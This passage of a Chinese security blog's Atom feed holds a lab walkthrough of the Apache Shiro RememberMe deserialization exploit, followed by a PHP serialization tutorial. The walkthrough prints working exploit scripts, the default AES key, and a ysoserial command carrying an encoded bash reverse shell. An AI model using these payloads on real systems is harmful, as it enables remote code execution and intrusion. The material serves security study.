    <summary type="html">&lt;h4 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h4&gt;&lt;p&gt;用户将恶意的sql语句输入到参数中，恶意语句拼接到后台sql语句，执行sql语句到时候使得攻击者获取到对应的敏感数据，比如当</summary>
      
    
    
    
    <category term="OWASP-TOP10" scheme="http://s1eady.top/categories/OWASP-TOP10/"/>
    
    
    <category term="OWSP-TOP10" scheme="http://s1eady.top/tags/OWSP-TOP10/"/>
    
  </entry>
  
  <entry>
    <title>Shiro安全</title>
    <link href="http://s1eady.top/2020/03/27/Apache_Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://s1eady.top/2020/03/27/Apache_Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-03-27T05:32:30.000Z</published>
    <updated>2020-10-16T11:47:17.853Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Shiro安全"><a href="#Shiro安全" class="headerlink" title="Shiro安全"></a>Shiro安全</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Apache Shiro 是一个强大灵活的开源安全框架，可以完全处理身份验证、授权、加密和会话管理。</p><h2 id="Shiro的功能"><a href="#Shiro的功能" class="headerlink" title="Shiro的功能"></a>Shiro的功能</h2><ul><li>验证用户身份</li><li>用户访问权限控制，比如：1、判断用户是否分配了一定的安全角色。2、判断用户是否被授予完成某个操作的权限</li><li>在非 Web 或 EJB 容器的环境下可以任意使用Session API</li><li>可以响应认证、访问控制，或者 Session 生命周期中发生的事件</li><li>可将一个或以上用户安全数据源数据组合成一个复合的用户 “view”(视图)</li><li>支持单点登录(SSO)功能</li><li>支持提供“Remember Me”服务，获取用户关联信息而无需登录</li></ul><h1 id="Apache-Shiro-反序列化漏洞实战"><a href="#Apache-Shiro-反序列化漏洞实战" class="headerlink" title="Apache Shiro 反序列化漏洞实战"></a>Apache Shiro 反序列化漏洞实战</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过对相关信息进行序列化，然后使用aes加密，最后在使用base64编码处理形成的。实际上漏洞与shiro版本无关, 无论是否升级shiro到1.2.5及以上, 如果shiro的rememberMe功能的AES密钥被泄露, 就会导致反序列化漏洞。</p><h3 id="RememberMe"><a href="#RememberMe" class="headerlink" title="RememberMe"></a>RememberMe</h3><p>1、检索RememberMe cookie 的值<br>2、Base 64解码<br>3、使用AES解密(加密密钥硬编码)<br>4、进行反序列化操作（未作过滤处理）</p><p>在调用反序列化时未进行任何过滤，导致可以触发远程代码执行漏洞。</p><p>用户登录凭证的生成，加密顺序：</p><p>Java序列化 —&gt; 使用密钥进行AES加密 —&gt; Base64加密 —&gt; 加密后的remember Me内容</p><p>在识别用户身份的时候，需要对remember Me的字段进行解密，解密的顺序为：</p><p> remember Me加密内容 —&gt; Base64解密 —&gt; 使用密钥进行AES解密 —&gt;Java反序列化。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>由于使用来aes加密，要想成功利用漏洞则需要获取aes的加密密钥，而在shiro的1.2.4之前版本中使用的是硬编码。其默认密钥的base64编码后的值为kPH+bIxk5D2deZiIxcaaaA==。这里就可以通过构造恶意的序列化对象进行编码，加密，然后作为cookie加密发送，服务端接收后会解密并触发反序列化漏洞。</p><p>1、AES加密是硬编码。</p><p>2、反序列化没有做任何过滤，外界传递什么值就反序列化什么值。</p><h3 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h3><p>如果登录页面有记住我的功能，登录页面的cookie中存在remeberMe=deleteMe的内容。</p><ul><li><p>使用burp测试</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/136A6698-B0F0-40A5-8222-A4778FDC93C6.png" alt="136A6698-B0F0-40A5-8222-A4778FDC93C6"></p><p>输入密码之后返回包中看到敏感字段</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200909161300847.png" alt="image-20200909161300847"></p></li><li><p>直接浏览器查看请求</p></li><li><p>fofa、shodan、zoomeye</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header&#x3D;&quot;rememberme&#x3D;deleteMe&quot;、header&#x3D;&quot;shiroCookie&quot;</span><br></pre></td></tr></table></figure></li></ul><h3 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h3><p>ysoserial是一款目前最流行的Java反序列化Payload生成工具，目前支持29种的Payload生成。本地通过JRMPClient的payload链接服务器上的JRMP服务使用网上的漏洞利用工具发送即可利用成功。</p><h4 id="RMI简介"><a href="#RMI简介" class="headerlink" title="RMI简介"></a>RMI简介</h4><p>Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。</p><h4 id="RMI的序列化和反序列化"><a href="#RMI的序列化和反序列化" class="headerlink" title="RMI的序列化和反序列化"></a>RMI的序列化和反序列化</h4><p>在RMI的通信过程中，用到了很多的序列化和反序列化，而在Java中，只要进行反序列化操作就可能有漏洞。RMI通过序列化传输Remote对象，那么我们可以构造恶意的Remote对象，当服务端反序列化传输过来的数据时，就会触发反序列化。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;http://127.0.0.1:8080/doLogin&quot;</span></span><br><span class="line">jar_file = <span class="string">&#x27;/Users/apple/Documents/steady-sec/shiro/ysoserial.jar&#x27;</span></span><br><span class="line">cipher_key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 rememberme的值</span></span><br><span class="line">popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;-jar&#x27;</span>,jar_file, <span class="string">&quot;URLDNS&quot;</span>, <span class="string">&quot;http://95d950.dnslog.cn&quot;</span>],</span><br><span class="line">                        stdout=subprocess.PIPE)</span><br><span class="line">BS = AES.block_size</span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">mode = AES.MODE_CBC</span><br><span class="line">iv = uuid.uuid4().bytes</span><br><span class="line">encryptor = AES.new(base64.b64decode(cipher_key), mode, iv)</span><br><span class="line">file_body = pad(popen.stdout.read())</span><br><span class="line">base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送request</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.get(target, cookies=&#123;<span class="string">&#x27;rememberMe&#x27;</span>:base64_ciphertext.decode()&#125;, timeout=<span class="number">30</span>)</span><br><span class="line">    print(r.status_code)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    traceback.print_exc()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">95</span>d950.dnslog.cn<span class="number">112.25</span><span class="number">.12</span><span class="number">.136</span><span class="number">2020</span><span class="number">-10</span><span class="number">-10</span> <span class="number">10</span>:<span class="number">07</span>:<span class="number">12</span></span><br></pre></td></tr></table></figure><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>检查key</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exploit.py -u http:&#x2F;&#x2F;127.0.0.1:8080</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">try CipherKey :5aaC5qKm5oqA5pyvAAAAAA&#x3D;&#x3D;</span><br><span class="line">generator payload done.</span><br><span class="line">send payload ok.</span><br><span class="line">checking.....</span><br><span class="line">checking.....</span><br><span class="line">checking.....</span><br><span class="line">checking.....</span><br><span class="line">try CipherKey :kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</span><br><span class="line">generator payload done.</span><br><span class="line">send payload ok.</span><br><span class="line">checking.....</span><br><span class="line"></span><br><span class="line">vulnerable:True url:http:&#x2F;&#x2F;127.0.0.1:8080CipherKey:kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>检查gadget</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exploit.py -u http:&#x2F;&#x2F;127.0.0.1:8080 -t 3 -p &quot;ping -c 2 http:&#x2F;&#x2F;ax18gp.dnslog.cn&quot; -k &quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;</span><br></pre></td></tr></table></figure><p>监听本地端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 1234</span><br></pre></td></tr></table></figure><p>通过ysoserial中JRMP监听模块，监听6666端口并执行反弹shell命令。</p><p>Java base64编码<code>http://www.jackson-t.ca/runtime-exec-payloads.html</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3Mi4xMzMvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</span><br></pre></td></tr></table></figure><p>CommonsCollections4、CommonsCollections2、CommonsCollections5都可以试试。</p><p>使用shiro.py 生成Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  shiro python shiro_poc_rember.py 127.0.0.1:6666</span><br><span class="line">rememberMe&#x3D;7sf6Aww8S9KEd7uQj2cX60H5BuTt8lt4IoELDzh2pXjkZENeSYWA7WNywqixdac4AY&#x2F;gNom7n+T0AfMgWvjob0njwuaOy4J3tl85oO0uUI+PUQ7IP9w3WYBtn50rRlIkckOfE8e64ps0528OCA6rSU2BkPbOvjpHgAPx8vzopDSGO85t03fBpX8nwzgR8QQyJ&#x2F;R&#x2F;6O7W85RTTxLyGLy9mYwoxYlHScecW&#x2F;jg&#x2F;fgDczxWIooKVKJPLiuCGozp7VddvPmUxrXV5YkzdYCTSXl6087aqul1yAbp0s1bGhVDLCdnwAeZgstLJFKrm2RauJEiM5gz5tkjlBmDZbWqXepaAybgFOgX2ya8xTFM5gN7XIgx8l8Mq2AtvC5gbg3oS1xtofOErw1Xx3kFEdow8AcvzQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">import subprocess</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">def encode_rememberme(command):</span><br><span class="line">    popen &#x3D; subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;&#x2F;Users&#x2F;apple&#x2F;Documents&#x2F;steady-sec&#x2F;shiro&#x2F;ysoserial.jar&#39;, &#39;JRMPClient&#39;, command], stdout&#x3D;subprocess.PIPE)</span><br><span class="line">    BS &#x3D; AES.block_size</span><br><span class="line">    pad &#x3D; lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key &#x3D; base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;)</span><br><span class="line">    iv &#x3D; uuid.uuid4().bytes</span><br><span class="line">    encryptor &#x3D; AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body &#x3D; pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext &#x3D; base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    return base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    payload &#x3D; encode_rememberme(sys.argv[1])    </span><br><span class="line">print &quot;rememberMe&#x3D;&#123;0&#125;&quot;.format(payload.decode())</span><br></pre></td></tr></table></figure><p>构造数据包，伪造cookie，发送Payload.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;doLogin HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko&#x2F;20100101 Firefox&#x2F;81.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 53</span><br><span class="line">Origin: http:&#x2F;&#x2F;127.0.0.1:8080</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;login;jsessionid&#x3D;65E88136CDB707384CB4A4C27659B658</span><br><span class="line">Cookie: JSESSIONID&#x3D;65E88136CDB707384CB4A4C27659B658;rememberMe&#x3D;7sf6Aww8S9KEd7uQj2cX60H5BuTt8lt4IoELDzh2pXjkZENeSYWA7WNywqixdac4AY&#x2F;gNom7n+T0AfMgWvjob0njwuaOy4J3tl85oO0uUI+PUQ7IP9w3WYBtn50rRlIkckOfE8e64ps0528OCA6rSU2BkPbOvjpHgAPx8vzopDSGO85t03fBpX8nwzgR8QQyJ&#x2F;R&#x2F;6O7W85RTTxLyGLy9mYwoxYlHScecW&#x2F;jg&#x2F;fgDczxWIooKVKJPLiuCGozp7VddvPmUxrXV5YkzdYCTSXl6087aqul1yAbp0s1bGhVDLCdnwAeZgstLJFKrm2RauJEiM5gz5tkjlBmDZbWqXepaAybgFOgX2ya8xTFM5gN7XIgx8l8Mq2AtvC5gbg3oS1xtofOErw1Xx3kFEdow8AcvzQ&#x3D;&#x3D;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">username&#x3D;admin&amp;password&#x3D;vulhub&amp;rememberme&#x3D;remember-me</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Shiro安全&quot;&gt;&lt;a href=&quot;#Shiro安全&quot; class=&quot;headerlink&quot; title=&quot;Shiro安全&quot;&gt;&lt;/a&gt;Shiro安全&lt;/h1&gt;&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简</summary>
      
    
    
    
    <category term="组件安全" scheme="http://s1eady.top/categories/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="组件安全" scheme="http://s1eady.top/tags/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>PHP开发学习--核心编程8</title>
    <link href="http://s1eady.top/2020/01/06/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B7/"/>
    <id>http://s1eady.top/2020/01/06/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B7/</id>
    <published>2020-01-05T18:12:34.000Z</published>
    <updated>2020-11-23T07:48:14.801Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP核心编程7"><a href="#PHP核心编程7" class="headerlink" title="PHP核心编程7"></a>PHP核心编程7</h1><h2 id="工厂设计模式"><a href="#工厂设计模式" class="headerlink" title="工厂设计模式"></a>工厂设计模式</h2><h3 id="什么是工厂设计模式"><a href="#什么是工厂设计模式" class="headerlink" title="什么是工厂设计模式"></a>什么是工厂设计模式</h3><p>根据传递不同的类名参数，返回不同类的对象；</p><p>工厂模式，就是生产各种的不同类的对象；</p><p>工厂模式，改变了在类外使用new关键字创建对象的方式，改成了在工厂类中创建类的对象。</p><p>在类的外部我们无法控制类的行为，但在类内部自己可以控制类的行为。</p><h3 id="工厂设计模式的要求"><a href="#工厂设计模式的要求" class="headerlink" title="工厂设计模式的要求"></a>工厂设计模式的要求</h3><p>一般情况下，定义一个工厂类；</p><p>工厂类中的方法，应该是公共的静态的方法；</p><p>该方法功能：就是根据传递的不同参数，去创建不同的类实例；</p><h3 id="实例：创建不同形状类的对象"><a href="#实例：创建不同形状类的对象" class="headerlink" title="实例：创建不同形状类的对象"></a>实例：创建不同形状类的对象</h3><p>工厂类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义形状工厂类：生产不同形状对象的工厂</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Factory</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//公共的静态的创建不同类对象的方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params">$className</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//根据传递的不同类名参数，返回不同类对象</span></span><br><span class="line"><span class="keyword">switch</span>($className)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;Rectangle&quot;</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> Rectangle();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;Circle&quot;</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> Circle();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;Line&quot;</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> Line();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用工厂类创建需要的类对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//类的自动加载</span></span><br><span class="line">spl_autoload_register(<span class="function"><span class="keyword">function</span>(<span class="params">$className</span>)</span>&#123;</span><br><span class="line"><span class="comment">//构建类文件的路径</span></span><br><span class="line">$filename = <span class="string">&quot;./libs/<span class="subst">$className</span>.class.php&quot;</span>;</span><br><span class="line"><span class="comment">//如果类文件存在，则包含</span></span><br><span class="line"><span class="keyword">if</span>(file_exists($filename))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> $filename.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span>($filename);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建矩形对象</span></span><br><span class="line">$rectangle = Factory::getInstance(<span class="string">&quot;Rectangle&quot;</span>);</span><br><span class="line">$rectangle-&gt;draw();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建圆形对象</span></span><br><span class="line">$circle = Factory::getInstance(<span class="string">&quot;Circle&quot;</span>);</span><br><span class="line">$circle-&gt;draw();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建线段对象</span></span><br><span class="line">$line = Factory::getInstance(<span class="string">&quot;Line&quot;</span>);</span><br><span class="line">$line-&gt;draw();</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201116105224380.png" alt="image-20201116105224380"></p><h2 id="变量序列化"><a href="#变量序列化" class="headerlink" title="变量序列化"></a>变量序列化</h2><h3 id="什么是变量序列化"><a href="#什么是变量序列化" class="headerlink" title="什么是变量序列化"></a>什么是变量序列化</h3><p>序列化是将变量转换为可保存或传输的字符串的过程；</p><p>反序列化就是在适当的时候把这个字符串再转化成原来的变量使用；</p><p>这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性；</p><p>序列化有利于存储或传递 PHP 的值，同时不丢失其类型和结构。</p><h3 id="序列化函数serialize"><a href="#序列化函数serialize" class="headerlink" title="序列化函数serialize()"></a>序列化函数serialize()</h3><p>描述：产生一个可存储的值的表示；</p><p>语法：<code>string serialize ( mixed $value )</code></p><p>参数：$value可以是任何类型，除了资源外；</p><p>返回：返回序列化之后的字符串，可以存储于任何地方。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//数组变量序列化</span></span><br><span class="line">$arr = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;db_host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_user&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_pass&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_name&#x27;</span> =&gt; <span class="string">&#x27;itcast&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"><span class="comment">//序列化：将变量转成可保存的字符串</span></span><br><span class="line">$str = serialize($arr);</span><br><span class="line"><span class="comment">//将序列化字符串，保存到记事本</span></span><br><span class="line">file_put_contents(<span class="string">&#x27;./1.txt&#x27;</span>,$str);</span><br></pre></td></tr></table></figure><h3 id="反序列化函数unserialize"><a href="#反序列化函数unserialize" class="headerlink" title="反序列化函数unserialize()"></a>反序列化函数unserialize()</h3><p>描述：从已存储的表示中创建 PHP 的值</p><p>语法：<code>***\*mixed unserialize ( string $str )\****</code></p><p>说明：对单一的已序列化的变量进行操作，将其转换回 PHP 的值。</p><p>参数：$str为序列化后的字符串；</p><p>返回：返回的是转换之后的值，可为 integer、float、string、array或 object。 如果传递的字符串不可序列化，则返回 FALSE，并产生一个 E_NOTICE。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//反序列化：序列化字符串，还原成原始变量</span></span><br><span class="line"><span class="comment">//读取记事本的数据</span></span><br><span class="line">$str = file_get_contents(<span class="string">&#x27;./1.txt&#x27;</span>);</span><br><span class="line"><span class="comment">//将序列化字符串，还原成变量</span></span><br><span class="line">$arr = unserialize($str);</span><br><span class="line"><span class="comment">//打印变量</span></span><br><span class="line">print_r($arr);</span><br></pre></td></tr></table></figure><h3 id="对象序列化"><a href="#对象序列化" class="headerlink" title="对象序列化"></a>对象序列化</h3><p>对象的序列化过程，与其它变量数据一样；</p><p>对象序列化的内容只能包含成员属性；</p><p>当序列化对象时，serialize()函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span 